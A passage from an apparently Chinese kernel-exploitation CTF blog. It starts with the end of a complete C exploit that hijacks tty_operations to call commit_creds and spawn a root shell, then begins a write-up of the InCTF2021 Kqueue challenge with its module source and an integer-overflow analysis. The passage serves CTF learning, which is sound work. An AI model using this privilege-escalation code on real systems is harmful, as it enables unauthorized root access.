class="hljs-keyword">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">// get kernel base</span><br>    tty_ops = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] work_for_cpu_fn: \033[0m%p\n&quot;</span>, WORK_FOR_CPU_FN + kernel_offset);<br><br>    <span class="hljs-comment">// find available note as fake tty_ops and fake stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br><br>    <span class="hljs-comment">// adjust the size of the object</span><br>    noteEdit(fake_tty_ops_idx, <span class="hljs-keyword">sizeof</span>(struct tty_operations), fake_tty_data);<br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br><br>    <span class="hljs-comment">// hijack the ioctl</span><br>    ((struct tty_operations *)fake_tty_ops_data)-&gt;ioctl = WORK_FOR_CPU_FN + kernel_offset;<br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-comment">/* ---- prepare_kernel_cred(NULL) ----*/</span><br><br>    <span class="hljs-comment">// store tty_struct data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* ---- commit_creds(ROOT) ----*/</span>getchar();<br><br>    <span class="hljs-comment">// get root cred back</span><br>    read(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// restore tty_struct data</span><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br>    fake_tty_data[<span class="hljs-number">6</span>] = tty_data[<span class="hljs-number">6</span>];<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯ææƒåˆ° root</p><p><a href="https://i.loli.net/2021/09/10/MKc5AXx9YwQzneU.png"><img src="https://s2.loli.net/2023/02/06/HREa2XWiDAPuVNs.png" alt="image.png"></a></p><h3 id="è§£æ³•ä¸‰ï¼šuserfaultfd-kernel-UAF-hijack-modprobe-path"><a href="#è§£æ³•ä¸‰ï¼šuserfaultfd-kernel-UAF-hijack-modprobe-path" class="headerlink" title="è§£æ³•ä¸‰ï¼šuserfaultfd + kernel UAF + hijack modprobe_path"></a>è§£æ³•ä¸‰ï¼šuserfaultfd + kernel UAF + hijack modprobe_path</h3><blockquote><p>To be ğŸ•ŠğŸ•ŠğŸ•Šâ€¦</p></blockquote><h1 id="Kernel-Heap-Heap-Overflow"><a href="#Kernel-Heap-Heap-Overflow" class="headerlink" title="Kernel Heap - Heap Overflow"></a>Kernel Heap - Heap Overflow</h1><p><strong>æº¢å‡º</strong>ï¼ˆOverflowï¼‰å‘æ¥éƒ½æ˜¯æœ€ä¸ºç»å…¸ã€ä¹Ÿæ˜¯æœ€ä¸ºå¸¸è§çš„ä¸€ç§æ¼æ´ï¼Œæ­¤å‰æˆ‘ä»¬å·²ç»æ¥è§¦äº†ä½äºå†…æ ¸æ ˆä¸Šçš„æº¢å‡ºæ¼æ´ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†å¼€å§‹è¿›å…¥å†…æ ¸åŠ¨æ€å†…å­˜åŒºä¸Šçš„ä¸–ç•Œ</p><h2 id="ä¾‹é¢˜ï¼šInCTF2021-Kqueue"><a href="#ä¾‹é¢˜ï¼šInCTF2021-Kqueue" class="headerlink" title="ä¾‹é¢˜ï¼šInCTF2021 - Kqueue"></a>ä¾‹é¢˜ï¼šInCTF2021 - Kqueue</h2><blockquote><p>æ®è¯´ InCTF å›½é™…èµ›ä¸ºå°åº¦çš„â€œå¼ºç½‘æ¯â€â€¦</p><p>åŸé¢˜ä¸‹è½½åœ°å€åœ¨<a href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">è¿™é‡Œ</a>ï¼Œæœ¬ç¯‡ wp å‚ç…§äº† <a href="https://bbs.pediy.com/thread-269031.htm">Scupax0s å¸ˆå‚…çš„ WP</a></p><p>è¿™é“é¢˜çš„æ–‡ä»¶ç³»ç»Ÿç”¨ Buildroot è¿›è¡Œæ„å»ºï¼Œ<strong>ç™»å…¥ç”¨æˆ·åä¸º ctfï¼Œå¯†ç ä¸º kqueue</strong>ï¼Œç¬”è€…æ‰¾äº†åŠå¤©æ‰åœ¨å®˜æ–¹ GitHub é‡Œçš„ Admin ä¸­æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬æ‰¾åˆ°çš„è¿™ä¸ªä¿¡æ¯â€¦</p><p>è¿˜æœ‰ä¸ªåŸå› ä¸æ˜çš„é—®é¢˜ï¼Œæœ¬åœ°é‡æ‰“åŒ…å<strong>è¿è¡Œæ ¹ç›®å½•ä¸‹ init æ—¶çš„ euid ä¸º 1000</strong>ï¼Œç¬”è€…åªå¥½æ‹‰ä¸€ä¸ªåˆ«çš„ kernel pwn çš„æ–‡ä»¶ç³»ç»Ÿè¿‡æ¥æš‚æ—¶é¡¶ç”¨â€¦</p></blockquote><h3 id="ä¿æŠ¤åˆ†æ"><a href="#ä¿æŠ¤åˆ†æ" class="headerlink" title="ä¿æŠ¤åˆ†æ"></a>ä¿æŠ¤åˆ†æ</h3><p>æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œåªå¼€å¯äº† kaslr ä¿æŠ¤ï¼Œæ²¡å¼€ KPTI ä¹Ÿæ²¡å¼€ smap&amp;smepï¼Œè¿˜æ˜¯ç»™äº†æˆ‘ä»¬ ret2usr çš„æœºä¼šçš„</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel <span class="hljs-string">&quot;bzImage&quot;</span> \<br>    -append <span class="hljs-string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \<br>    -monitor /dev/null \<br>    -initrd <span class="hljs-string">&quot;./rootfs.cpio&quot;</span> \<br>    -net user \<br>    -net nic<br></code></pre></div></td></tr></table></figure><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>é¢˜ç›®ç»™å‡ºäº†æºä»£ç ï¼Œå…å»äº†æˆ‘ä»¬é€†å‘çš„éº»çƒ¦</p><blockquote><p>ä½†æœ‰çš„æ—¶å€™ç»™å‡ºæºç åè€Œä¼šå¢å¤§è§£é¢˜éš¾åº¦ï¼Œæ¯”å¦‚è¯´ *CTF2021 çš„ babygame <del>C++ PWNèƒ½ä¸èƒ½çˆªå·´</del></p></blockquote><p>åœ¨ <code>kqueue.h</code> ä¸­åªå®šä¹‰äº†ä¸€ä¸ª ioctl å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kqueue_ioctl</span><span class="hljs-params">(struct file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span>;<br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kqueue_fops</span> =</span> &#123;.unlocked_ioctl = kqueue_ioctl&#125;;<br></code></pre></div></td></tr></table></figure><p>ioctl çš„å‡½æ•°å®šä¹‰ä½äº <code>kqueue.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">kqueue_ioctl</span><span class="hljs-params">(struct file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span>&#123;<br><br>    <span class="hljs-keyword">long</span> result;<br><br>    <span class="hljs-keyword">request_t</span> request;<br><br>    mutex_lock(&amp;operations_lock);<br><br>    <span class="hljs-keyword">if</span> (copy_from_user((<span class="hljs-keyword">void</span> *)&amp;request, (<span class="hljs-keyword">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">request_t</span>)))&#123;<br>        err(<span class="hljs-string">&quot;[-] copy_from_user failed&quot;</span>);<br>        <span class="hljs-keyword">goto</span> ret;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span>(cmd)&#123;<br>        <span class="hljs-keyword">case</span> CREATE_KQUEUE:<br>            result = create_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DELETE_KQUEUE:<br>            result = delete_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT_KQUEUE:<br>            result = edit_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SAVE:<br>            result = save_kqueue_entries(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            result = INVALID;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>ret: <br>    mutex_unlock(&amp;operations_lock);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬è¦ä¼ å…¥çš„ç»“æ„ä½“åº”å½“ä¸º <code>request_t</code> ç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-keyword">uint32_t</span> max_entries;<br>    <span class="hljs-keyword">uint16_t</span> data_size;<br>    <span class="hljs-keyword">uint16_t</span> entry_idx;<br>    <span class="hljs-keyword">uint16_t</span> queue_idx;<br>    <span class="hljs-keyword">char</span>* data;<br>&#125;<span class="hljs-keyword">request_t</span>;<br></code></pre></div></td></tr></table></figure><p>åœ¨ ioctl ä¸­å®šä¹‰äº†æ¯”è¾ƒç»å…¸çš„å¢åˆ æ”¹æŸ¥æ“çºµï¼Œä¸‹é¢é€ä¸ªåˆ†æ</p><h4 id="err"><a href="#err" class="headerlink" title="*err"></a>*<em>err</em></h4><p>ç¬”è€…å‘ç°åœ¨å…¶å®šä¹‰çš„ä¸€ç³»åˆ—å‡½æ•°å½“ä¸­éƒ½æœ‰ä¸€ç³»åˆ—çš„æ£€æŸ¥ï¼Œè‹¥æ£€æŸ¥ä¸é€šè¿‡åˆ™ä¼šè°ƒç”¨ <code>err</code> å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* msg)</span></span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´<strong>æ‰€æœ‰çš„æ£€æŸ¥æ²¡æœ‰ä»»ä½•çš„å®é™…æ„ä¹‰ï¼Œå“ªæ€•ä¸é€šè¿‡æ£€æŸ¥ä¹Ÿä¸ä¼šé˜»ç¢ç¨‹åºçš„è¿è¡Œ</strong>ï¼Œç»ç¬”è€…å®æµ‹ç¡®ä¹å¦‚æ­¤</p><h4 id="create-kqueue"><a href="#create-kqueue" class="headerlink" title="create_kqueue"></a>create_kqueue</h4><p>ä¸»è¦æ˜¯è¿›è¡Œé˜Ÿåˆ—çš„åˆ›å»ºï¼Œé™åˆ¶äº†é˜Ÿåˆ—æ•°é‡ä¸å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">create_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-keyword">long</span> result = INVALID;<br><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><br>    <span class="hljs-comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><br>    <span class="hljs-comment">/* Asking for too much is also not good */</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Initialize kqueue_entry structure */</span><br>    queue_entry *kqueue_entry;<br><br>    <span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Size is the size of queue structure + size of entry * request entries */</span><br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Total size should not exceed a certain limit */</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br>    <span class="hljs-comment">/* All checks done , now call kzalloc */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-keyword">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Main queue can also store data */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Fill the remaining queue structure */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br><br>    <span class="hljs-comment">/* Get to the place from where memory has to be handled */</span><br>    kqueue_entry = (queue_entry *)((<span class="hljs-keyword">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br><br>    <span class="hljs-comment">/* Allocate all kqueue entries */</span><br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br><br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-keyword">char</span> *)(validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* Find an appropriate slot in kqueues */</span><br>    <span class="hljs-keyword">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­ä¸€ä¸ª queue ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œå¤§å°ä¸º 0x18ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-keyword">uint16_t</span> data_size;<br>    <span class="hljs-keyword">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span><br>    <span class="hljs-keyword">uint32_t</span> max_entries;<br>    <span class="hljs-keyword">uint16_t</span> idx;<br>    <span class="hljs-keyword">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„ä¿å­˜åˆ†é…çš„ queue</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></div></td></tr></table></figure><p>åœ¨è¿™é‡Œç”¨åˆ°äº† <a href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc å†…ç½®å‡½æ•°</a> <code>__builtin_umulll_overflow</code>ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯å°†å‰ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜ç»™åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç”Ÿæº¢å‡ºåˆ™è¿”å› trueï¼Œ<code>__builtin_saddll_overflow</code> ä¸ä¹‹ç±»ä¼¼ä¸è¿‡æ˜¯åŠ æ³•</p><p>é‚£ä¹ˆè¿™é‡Œè™½ç„¶ queue ç»“æ„ä½“çš„æˆå‘˜æ•°é‡ä¼¼ä¹æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åœ¨ kmalloc æ—¶ä¼ å…¥çš„ size ä¸º <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>ï¼Œå…¶å‰©ä½™çš„ç©ºé—´ç”¨ä½œ queue_entry ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-keyword">uint16_t</span> idx;<br>    <span class="hljs-keyword">char</span> *data;<br>    queue_entry *next;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ª<strong>æ•´å‹æº¢å‡ºæ¼æ´</strong>ï¼šå¦‚æœåœ¨ <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> ä¸­æˆ‘ä»¬ä¼ å…¥çš„ <code>request.max_entries</code> ä¸º <code>0xffffffff</code>ï¼ŒåŠ ä¸€åå˜ä¸º0ï¼Œæ­¤æ—¶ä¾¿èƒ½é€šè¿‡æ£€æµ‹ï¼Œä½† space 